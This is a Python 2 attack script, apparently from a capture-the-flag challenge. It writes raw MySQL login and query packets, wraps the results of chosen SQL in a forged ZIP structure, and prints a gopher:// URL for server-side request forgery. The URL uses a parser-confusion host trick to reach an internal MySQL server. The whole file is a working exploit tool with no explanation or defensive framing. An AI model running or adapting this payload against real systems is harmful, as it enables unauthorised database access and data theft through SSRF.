#!/usr/bin/env python
# coding=utf-8

from socket import *
from struct import *
from urllib2 import quote,unquote
import sys
import hashlib
import argparse



def hexdump(src, title, length=16):
    result = []
    digits = 4 if isinstance(src, unicode) else 2

    for i in xrange(0, len(src), length):
        s = src[i:i + length]
        hexa = b''.join(["%0*X" % (digits, ord(x)) for x in s])
        hexa = hexa[:16]+" "+hexa[16:]
        text = b''.join([x if 0x20 <= ord(x) < 0x7F else b'.' for x in s])
        result.append(b"%04X  %-*s  %s" % (i, length * (digits + 1), hexa, text))
    print title
    print(b'\n'.join(result))
    print '\n'

def create_zip(filename, content_size):
    content = '-'*content_size
    filename = pack('<%ds'%len(filename), filename)
    content_len_b = pack('<I', len(content))
    filename_len_b = pack('<H', len(filename))
    local_file_header = b"\x50\x4b\x03\x04\x0a\x00"+"\x00"*12
    local_file_header += content_len_b*2
    local_file_header += filename_len_b
    local_file_header += "\x00\x00"
    local_file_header += filename
    cd_file_header = b"\x50\x4b\x01\x02\x1e\x03\x0a\x00"+"\x00"*12+filename_len_b+"\x00"*16+filename
    cd_file_header_len_b = pack("<I", len(cd_file_header))
    offset = pack("<I",len(local_file_header+cd_file_header))
    eof_record = b"\x50\x4b\x05\x06"+"\x00"*4+"\x01\x00"*2+cd_file_header_len_b+offset+"\x00\x00"
    #return each party of zip
    return [local_file_header,content,cd_file_header+eof_record]



class Protocal:   
    last_packet_index = 0 
    connect_status = 0 #mark last connection is finish or no
    login_packet = ''
    def __init__(self, host, port, username, password, database):
        self.username = username
        self.password = password
        self.database = database
        self.host = host
        self.port = port
        

    def __unpack(self, data):
        length = unpack('I', data[:3]+b'\x00')
        self.last_packet_index = unpack('B', data[3:4])[0]
        if len(data)-4 != length[0]:
            print '[-] packet parse error, except lengt {} but {}'.format(length[0], len(data))
            sys.exit(1)
        return data[4:];

    def __pack(self, data):
        if self.connect_status == 0:
            self.last_packet_index += 1
        elif self.connect_status == 1:
            self.last_packet_index = 0
        header = len(data)
        header = pack('<I', len(data))[:3]+pack('B', self.last_packet_index)
        return header+data

    def __parse_handshake(self, data):
        if DEBUG:
            hexdump(data,'server handshake')
        data = self.__unpack(data)
        protocolVersion = unpack('B', data[:1])
        svLen = 0
        for byte in data[1:]:
            svLen += 1
            if byte == b'\x00':
                break;
        serverVersion = data[1:svLen]
        threadId = unpack('I', data[svLen+1:svLen+5])
        scramble = unpack('8B', data[svLen+5:svLen+13])
        serverEncode = unpack('B',data[svLen+16:svLen+17])
        scramble += unpack('12B', data[svLen+32:svLen+44])
        scramble = ''.join([chr(i) for i in scramble])
        packet = {
            'protocolVersion':protocolVersion[0],
            'serverVersion':serverVersion[0],
            'threadId':threadId[0],
            'scramble':scramble,
            'serverEncode':serverEncode[0]
        }
        return packet

    def encode_password(self, password, scramble):
        if password:
            stage1_hash = self.__sha1(password)
            token = self.xor_string(self.__sha1(scramble+self.__sha1(stage1_hash)), stage1_hash)
            return token
        else:
            return ""

    def xor_string(self, str1, str2):
        r = ''
        for x,y in zip(str1, str2):
            r += chr(ord(x)^ord(y))
        return r

    def __sha1(self, data):
        m = hashlib.sha1()
        m.update(data)
        return m.digest()
    
    def get_client_capabilities(self):
        CLIENT_LONG_PASSWORD = 0x0001
        CLIENT_FOUND_ROWS = 0x0002
        CLIENT_LONG_FLAG         = 0x0004
        CLIENT_CONNECT_WITH_DB = 0x0008
        CLIENT_ODBC = 0x0040
        CLIENT_IGNORE_SPACE = 0x0100
        CLIENT_PROTOCOL_41 = 0x0200
        CLIENT_INTERACTIVE = 0x0400
        CLIENT_IGNORE_SIGPIPE = 0x1000
        CLIENT_TRANSACTIONS = 0x2000
        CLIENT_SECURE_CONNECTION = 0x8000
        flag = 0;
        flag = flag|CLIENT_LONG_PASSWORD|CLIENT_FOUND_ROWS|CLIENT_LONG_FLAG|CLIENT_CONNECT_WITH_DB|CLIENT_ODBC|CLIENT_IGNORE_SPACE|CLIENT_PROTOCOL_41|CLIENT_INTERACTIVE|CLIENT_IGNORE_SIGPIPE|CLIENT_TRANSACTIONS|CLIENT_SECURE_CONNECTION;
        return pack('I', flag);

    def __write(self, data):
        return self.sock.send(data)

    def __read(self, lentgh):
        return self.sock.recv(lentgh)   

    def __get_login_packet(self, scramble):
        packet = ''
        packet += self.get_client_capabilities() #clientFlags
        packet += pack('I', 1024*1024*16) #maxPacketSize
        packet += b'\x21' #charset 0x21=utf8
        packet += b'\x00'*23
        packet += self.username+b'\x00'
        passowrd = self.encode_password(self.password, scramble)
        packet += chr(len(passowrd))+passowrd
        packet += self.database + b'\x00'
        packet = self.__pack(packet)
        return packet

    def execute(self, sql):
        packet = self.__pack(b'\x03'+sql)
        if DEBUG:
            hexdump(packet, 'execute request packet')
        self.__write(packet)
        response = self.__read(1000)
        if DEBUG:
            hexdump(response, 'execute result packet')
        return response

    def __login(self, scramble):
        packet = self.__get_login_packet(scramble);
        if DEBUG:
            hexdump(packet, 'client login packet:')
        self.__write(packet);
        response = self.__read(1024)
        responsePacket = self.__unpack(response)
        self.connect_status = 1;
        if responsePacket[0] == b'\x00':
            print '[+] Login Success'
        else:
            print '[+] Login error, reason:{}'.format(responsePacket[4:])
        if DEBUG:
            hexdump(response, 'client Login Result packet:')

    def get_payload(self, _sql, size, verbose):
        if _sql[-1] == ';':
            _sql = _sql[:-1]
        zipFile = create_zip('this_is_the_flag', size)
        sql = 'select concat(cast({pre} as binary), rpad(({sql}), {size}, \'-\'), cast({suf} as binary))'.format(pre='0x'+zipFile[0].encode('hex'), sql=_sql, size=size, suf='0x'+zipFile[2].encode('hex'))
        if verbose:
            print 'sql: ',sql
        login_packet = self.__get_login_packet('')
        self.connect_status = 1;
        packet = self.__pack(b'\x03'+sql)
        return login_packet + packet

    def connect(self):
        try:
            self.sock = socket(AF_INET, SOCK_STREAM)
            self.sock.connect((self.host, int(self.port)))
        except Exception,e:
            print '[-] connect error: {}'.format(str(e))
            return
        handshakePacket = self.__read(1024)
        handshakeInfo = self.__parse_handshake(handshakePacket);
        self.__login(handshakeInfo['scramble'])





parser = argparse.ArgumentParser(description='generate payload of gopher attack mysql')
parser.add_argument("-u", "--user", help="database user", required=True)
parser.add_argument("-d", "--database", help="select database", required=True)
parser.add_argument("-t", "--target", dest="host", help="database host", default="127.0.0.1")
parser.add_argument("-p", "--password", help="database password default null", default="")
parser.add_argument("-P", "--payload", help="the sql you want to execute with out ';'", required=True)
parser.add_argument("-v", "--verbose", help="dump details", action="store_true")
parser.add_argument("-c", "--connect", help="connect your database", action="store_true")
parser.add_argument("--sql", help="print generated sql", action="store_true")



if __name__ == '__main__':
    args = parser.parse_args()
    DEBUG = 0
    if args.verbose:
        DEBUG = 1
    #default database user m4st3r_ov3rl0rd
    protocal = Protocal(args.host, '3306', args.user, args.password, args.database)
    if args.connect:
        protocal.connect()
        result = protocal.execute(args.payload)
        print '-'*100
        print '| sql:',args.payload,'|'
        print '-'*100
        print 'Result: ',result
        print '-'*100

    payload = protocal.get_payload(args.payload, 1000, args.verbose)+'\x00'*4
    print '\nPayload:'
    print ' '*5,'gopher://foo@[cafebabe.cf]@yolo.com:3306/A'+quote(payload)














